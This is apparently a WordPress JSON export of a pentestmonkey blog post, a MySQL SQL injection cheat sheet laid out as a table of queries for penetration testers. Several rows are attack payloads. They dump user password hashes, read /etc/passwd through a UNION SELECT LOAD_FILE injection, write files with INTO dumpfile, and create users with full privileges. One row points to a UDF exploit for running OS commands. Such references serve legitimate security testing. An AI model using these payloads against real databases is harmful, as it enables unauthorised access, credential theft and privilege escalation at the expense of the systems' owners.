{"id":86,"date":"2007-11-27T20:19:32","date_gmt":"2007-11-27T20:19:32","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=86"},"modified":"2011-11-11T19:10:51","modified_gmt":"2011-11-11T19:10:51","slug":"mysql-sql-injection-cheat-sheet","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/cheat-sheet\/sql-injection\/mysql-sql-injection-cheat-sheet","title":{"rendered":"MySQL SQL Injection Cheat Sheet"},"content":{"rendered":"<p>Some useful syntax reminders for SQL Injection into MySQL databases&#8230;<\/p>\n<p><!--more--><\/p>\n<p>This post is part of a series of SQL Injection Cheat Sheets.\u00a0 In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.\u00a0 This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.<\/p>\n<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:<\/p>\n<ul>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/oracle-sql-injection-cheat-sheet\/\">Oracle<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/mssql-sql-injection-cheat-sheet\/\">MSSQL<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/mysql-sql-injection-cheat-sheet\/\">MySQL<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/postgres-sql-injection-cheat-sheet\/\">PostgreSQL<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/ingres-sql-injection-cheat-sheet\/\">Ingres<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/db2-sql-injection-cheat-sheet\/\">DB2<\/a><\/li>\n<li><a href=\"http:\/\/pentestmonkey.net\/blog\/informix-sql-injection-cheat-sheet\/\">Informix<\/a><\/li>\n<\/ul>\n<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href=\"http:\/\/nibblesec.org\/files\/MSAccessSQLi\/MSAccessSQLi.html\">MS Access Cheat Sheet here<\/a>.<\/p>\n<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.<\/p>\n<table border=\"1\">\n<tbody>\n<tr>\n<td>Version<\/td>\n<td>SELECT @@version<\/td>\n<\/tr>\n<tr>\n<td>Comments<\/td>\n<td>SELECT 1; #comment<br \/>\nSELECT \/*comment*\/1;<\/td>\n<\/tr>\n<tr>\n<td>Current User<\/td>\n<td>SELECT user();<br \/>\nSELECT system_user();<\/td>\n<\/tr>\n<tr>\n<td>List Users<\/td>\n<td>SELECT user FROM mysql.user; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>List Password Hashes<\/td>\n<td>SELECT host, user, password FROM mysql.user; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Password Cracker<\/td>\n<td><a href=\"http:\/\/www.openwall.com\/john\/\">John the Ripper<\/a> will crack MySQL password hashes.<\/td>\n<\/tr>\n<tr>\n<td>List Privileges<\/td>\n<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; &#8212; list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; &#8212; priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; &#8212; list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; &#8212; list privs on columns<\/td>\n<\/tr>\n<tr>\n<td>List DBA Accounts<\/td>\n<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = &#8216;SUPER&#8217;;SELECT host, user FROM mysql.user WHERE Super_priv = &#8216;Y&#8217;; # priv<\/td>\n<\/tr>\n<tr>\n<td>Current Database<\/td>\n<td>SELECT database()<\/td>\n<\/tr>\n<tr>\n<td>List Databases<\/td>\n<td>SELECT schema_name FROM information_schema.schemata; &#8212; for MySQL &gt;= v5.0<br \/>\nSELECT distinct(db) FROM mysql.db &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>List Columns<\/td>\n<td>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &#8216;mysql&#8217; AND table_schema != &#8216;information_schema&#8217;<\/td>\n<\/tr>\n<tr>\n<td>List Tables<\/td>\n<td>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#8216;mysql&#8217; AND table_schema != &#8216;information_schema&#8217;<\/td>\n<\/tr>\n<tr>\n<td>Find Tables From Column Name<\/td>\n<td>SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = &#8216;username&#8217;; &#8212; find table which have a column called &#8216;username&#8217;<\/td>\n<\/tr>\n<tr>\n<td>Select Nth Row<\/td>\n<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0<br \/>\nSELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0<\/td>\n<\/tr>\n<tr>\n<td>Select Nth Char<\/td>\n<td>SELECT substr(&#8216;abcd&#8217;, 3, 1); # returns c<\/td>\n<\/tr>\n<tr>\n<td>Bitwise AND<\/td>\n<td>SELECT 6 &amp; 2; # returns 2<br \/>\nSELECT 6 &amp; 1; # returns 0<\/td>\n<\/tr>\n<tr>\n<td>ASCII Value -&gt; Char<\/td>\n<td>SELECT char(65); # returns A<\/td>\n<\/tr>\n<tr>\n<td>Char -&gt; ASCII Value<\/td>\n<td>SELECT ascii(&#8216;A&#8217;); # returns 65<\/td>\n<\/tr>\n<tr>\n<td>Casting<\/td>\n<td>SELECT cast(&#8216;1&#8217; AS unsigned integer);<br \/>\nSELECT cast(&#8216;123&#8217; AS char);<\/td>\n<\/tr>\n<tr>\n<td>String Concatenation<\/td>\n<td>SELECT CONCAT(&#8216;A&#8217;,&#8217;B&#8217;); #returns AB<br \/>\nSELECT CONCAT(&#8216;A&#8217;,&#8217;B&#8217;,&#8217;C&#8217;); # returns ABC<\/td>\n<\/tr>\n<tr>\n<td>If Statement<\/td>\n<td>SELECT if(1=1,&#8217;foo&#8217;,&#8217;bar&#8217;); &#8212; returns &#8216;foo&#8217;<\/td>\n<\/tr>\n<tr>\n<td>Case Statement<\/td>\n<td>SELECT CASE WHEN (1=1) THEN &#8216;A&#8217; ELSE &#8216;B&#8217; END; # returns A<\/td>\n<\/tr>\n<tr>\n<td>Avoiding Quotes<\/td>\n<td>SELECT 0x414243; # returns ABC<\/td>\n<\/tr>\n<tr>\n<td>Time Delay<\/td>\n<td><span>SELECT BENCHMARK(1000000,MD5(&#8216;A&#8217;));<br \/>\nSELECT SLEEP(5); # &gt;= 5.0.12<br \/>\n<\/span><\/td>\n<\/tr>\n<tr>\n<td>Make DNS Requests<\/td>\n<td>Impossible?<\/td>\n<\/tr>\n<tr>\n<td>Command Execution<\/td>\n<td>If mysqld (&lt;5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into \/usr\/lib (or similar).\u00a0 The .so file should contain a User Defined Function (UDF).\u00a0 <a href=\"http:\/\/www.0xdeadbeef.info\/exploits\/raptor_udf.c\">raptor_udf.c<\/a> explains exactly how you go about this.\u00a0 Remember to compile for the target architecture which may or may not be the same as your attack platform.<\/td>\n<\/tr>\n<tr>\n<td>Local File Access<\/td>\n<td>&#8230;&#8217; UNION ALL SELECT LOAD_FILE(&#8216;\/etc\/passwd&#8217;) &#8212; priv, can only read world-readable files.<br \/>\nSELECT * FROM mytable INTO dumpfile &#8216;\/tmp\/somefile&#8217;; &#8212; priv, write to file system<\/td>\n<\/tr>\n<tr>\n<td>Hostname, IP Address<\/td>\n<td>SELECT @@hostname;<\/td>\n<\/tr>\n<tr>\n<td>Create Users<\/td>\n<td>CREATE USER test1 IDENTIFIED BY &#8216;pass1&#8217;; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Delete Users<\/td>\n<td>DROP USER test1; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Make User DBA<\/td>\n<td>GRANT ALL PRIVILEGES ON *.* TO test1@&#8217;%&#8217;; &#8212; priv<\/td>\n<\/tr>\n<tr>\n<td>Location of DB files<\/td>\n<td>SELECT @@datadir;<\/td>\n<\/tr>\n<tr>\n<td>Default\/System Databases<\/td>\n<td>information_schema (&gt;= mysql 5.0)<br \/>\nmysql<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n<h3>Thanks<\/h3>\n<p>Jonathan Turner for @@hostname tip.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>Some useful syntax reminders for SQL Injection into MySQL databases&#8230;<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[8],"tags":[46,44,102,19,78],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/86"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=86"}],"version-history":[{"count":8,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/86\/revisions"}],"predecessor-version":[{"id":683,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/86\/revisions\/683"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=86"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=86"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=86"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}